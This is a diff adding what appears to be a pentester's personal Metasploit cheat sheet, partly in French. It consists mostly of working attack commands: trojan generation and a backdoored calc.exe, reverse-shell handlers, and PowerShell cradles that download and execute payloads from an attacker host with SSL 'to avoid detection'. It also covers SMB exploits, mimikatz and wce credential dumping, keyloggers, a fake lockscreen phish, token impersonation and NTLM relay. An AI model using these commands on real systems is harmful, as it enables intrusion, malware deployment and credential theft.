@@ -1,0 +1,209 @@
+# metasploit
+
+https://metasploit.github.io/
+
+# basic trojan
+./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.122.1 LPORT=4444 X > meter.exe
+./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.122.1 LPORT=4444 R | ./msfencode -b '' -t exe -o meterpreter.exe
+./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.122.1 R | ./msfencode -t exe -x calc.exe -k -o calc_backdoor.exe -e x86/shikata_ga_nai -c 5 // x86 only?
+./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.122.1 R | python ~/tools/exploit/pwntools/scramble/scramble - | ./msfencode -t exe -e generic/none -o blah.exe // to try
+http://carnal0wnage.attackresearch.com/node/409
+
+# quick wins
+./msfconsole -x 'use multi/handler; set payload cmd/unix/reverse_bash; set lport 1234; set lhost 127.0.0.1; set ExitOnSession false; exploit -j -z' # handle multiple reverse shells
+./msfconsole -x 'use multi/handler; set payload windows/meterpreter/reverse_tcp; set lport 1234; set lhost 192.168.122.1; exploit -j -z'
+./msfvenom -e x86/alpha_mixed -f raw -p windows/meterpreter/reverse_tcp BufferRegister=EAX LPORT=1234 LHOST=
+
+./msfconsole -x 'use exploit/multi/script/web_delivery; set URIPATH /foo; set lport 1234; set lhost 192.168.122.1; set target 2; exploit -j -z'
+c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe #if c:\windows\system32\powershell.exe doesnt exist
+powershell.exe -nop -c IEX ((new-object net.webclient).downloadstring('http://192.168.122.1:8080/foo')) #simple
+powershell.exe -nop -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX ((new-object net.webclient).downloadstring('https://192.168.122.1:8080/foo')) # simple w/ ssl to avoid detection
+
+powershell.exe -nop -w hidden -c $O=new-object net.webclient;$O.proxy=[Net.WebRequest]::GetSystemWebProxy();$O.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $O.downloadstring('http://192.168.122.1:8080/foo'); #msf
+powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$s=new-object net.webclient;$s.proxy=[Net.WebRequest]::GetSystemWebProxy();$s.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $s.downloadstring('https://192.168.122.1:8080/foo'); # msf w/ ssl
+
+msfcli exploit/windows/smb/psexec RHOST= SMBUser= SMBPass= SMBDomain= PAYLOAD=windows/meterpreter/bind_tcp E
+msfcli exploit/windows/smb/ms08_067_netapi RHOST= PAYLOAD=windows/meterpreter/bind_tcp E
+msfcli exploit/windows/antivirus/ams_hndlrsvc RHOST= CMD='telnet x.x.x.x 445' E
+msfcli auxiliary/scanner/smb/smb_lookupsid RHOSTS=file:dcs.txt E
+msfcli modules/auxiliary/scanner/snmp/snmp_login RHOST=x.x.x.x E
+msfcli auxiliary/server/capture/smb JOHNPWFILE=/tmp/capture-smb.pw VERBOSE=true SRVHOST=127.0.0.1 SRVPORT=4445 E (and as root: socat tcp-l:445,fork,reuseaddr tcp:127.0.0.1:4445)
+
+# low hanging fruits
+auxiliary/scanner/smb/smb_version
+exploit/windows/smb/ms08_067_netapi
+auxiliary/scanner/smb/smb_enumusers
+auxiliary/scanner/smb/smb_lookupsid
+auxiliary/scanner/oracle/sid_enum
+auxiliary/scanner/misc/java_rmi_server
+auxiliary/scanner/lotus/lotus_domino_hashes
+
+# client side
+Office OLE multiple DLL https://vimeo.com/138840584
+
+# main commands
+show options
+show advanced
+set (includes setg output)
+back
+set proxies http:127.0.0.1:8082 // or socks4:127.0.0.1:8082
+
+getuid
+sysinfo
+getpid
+ps
+services
+
+# dev
+rexploit # reloads module
+
+# elevation
+run post/<TAB> // to list all available
+run migrate or smart_migrate
+run vnc
+run screen_unlock
+
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+use priv
+getsystem -t 1 ... http://carnal0wnage.attackresearch.com/node/404
+getuid
+rev2self // revenir sous le user precedent
+
+stal_token
+shell // uses impersonated token by default (-t option of execute)
+drop_token
+
+# recup infos
+scraper
+winenum
+wmic
+
+# enable telnet
+gettelnet -e
+
+# port scanner
+meterpreter > run autoroute -s 10.p.c.i/24
+^Z
+use auxiliary/scanner/portscan/tcp
+set THREADS 10
+set CONCURRENCY 10
+
+or try out msfmap in tools
+
+# port fwd
+portfwd add -l 1234 -p 3389 -r 10.0.0.2
+
+# post-exploit
+* msf/meterpreter
+hashdump
+use post/windows/gather/cachedump
+set SESSION 1
+run
+
+lancer les outils suivants dans un shell SYSTEM, donc soit avec:
+  - execute -m -i -f tool.exe [-a des options ...] (ressayer plusieurs fois si rien ne s'affiche)
+execute -m -i -f /home/seb/tools/exploit/wce64.exe 
+execute -m -i -f /home/seb/tools/exploit/wce64.exe -a -w
+execute -m -i -f /home/seb/tools/exploit/gsecdump.exe -a -a
+
+meterpreter > download c:\\windows\\system32\\calc.exe
+meterpreter > execute -H -i -c -m -d calc.exe -f mimikatz.exe -a '"sekurlsa::logonPasswords full" exit'
+
+sc \\msfdc01\ create test_ptc binPath= "cmd.exe /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://10.6.6.6:8080/'))"
+
+  - sinon depuis un cmd.exe
+wce.exe
+wce.exe -w
+
+gsecdump -a
+
+mimikatz.exe
+privilege::debug
+sekurlsa::logonPasswords
+sekurlsa::ssp
+samdump::hashes
+
+# auto with rc scripts
+msf.rc:
+set ConsoleLogging true
+set LogLevel 5
+set SessionLogging true
+set TimestampOutput true
+set PROMPT %T S:%S J:%J
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.122.1
+set LPORT 4444
+set ExitOnSession false
+set AutoRunScript multiscript -rc /path/to/meterpreter.rc
+exploit -j -z
+
+meterpreter.rc:
+get_env
+multi_console_command -cl "getuid","sysinfo","webcam_snap","screenshot"
+migrate -f
+checkvm
+
+might need to migrate to proper process to get screenshot or keylock-sniff-pw etc.
+
+./msfconsole -r msf.rc
+
+shim2.exe <...>
+
+# generate standalone exe from msfconsole
+generate -t exe -f blah.exe
+
+# kiwi
+load kiwi (load mimikatz for old version)
+
+# misc notes
+whosthere ne marche pas sur 2008
+whosthere-alt a deja marche sur 2008 et 2003 (mais produit la meme sortie que wce.exe)
+
+wce -e crash au bout d'un moment, mieux vaut utiliser wce -r 
+
+* incognito
+use incognito
+list_tokens -u
+impersonate ...
+getuid
+execute -t -i -c -H -f cmd.exe 
+whoami
+execute -t -f c:\\windows\\temp\\shim2.exe -a PYIII...
+
+* CMD
+./msfpayload java/meterpreter/bind_tcp LPORT=5556 X > lin.jar
+wget -O /tmp/lin.jar http://<server>/lin.jar
+java -jar /tmp/lin.jar
+
+# golden ticket in meterpreter
+http://blog.strategiccyber.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/
+
+# ms14-068 in metasploit
+https://community.rapid7.com/community/metasploit/blog/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit
+
+# phish
+* keylogger
+run post/windows/capture/keylog_recorder # capture winlogon creds
+run post/windows/capture/lockout_keylogger # fake lockscreen
+
+https://forsec.nl/2015/02/windows-credentials-phishing-using-metasploit/
+
+# harvesting files
+http://carnal0wnage.attackresearch.com/2015/02/my-golddigger-script.html
+
+# http ntlm auth attempt to smb relay
+use auxiliary/server/http_ntlmrelay
+
+set URIPATH /
+set SRVPORT 80
+set RHOST 10.0.0.101 // BACKUP DC
+set RPORT 445
+set RTYPE SMB_PWN
+set RURIPATH \\\\10.6.6.6\share\shim2.exe // payload hard-coded
+
+# api
+https://osandamalith.wordpress.com/2015/02/19/accessing-the-windows-api-directly/
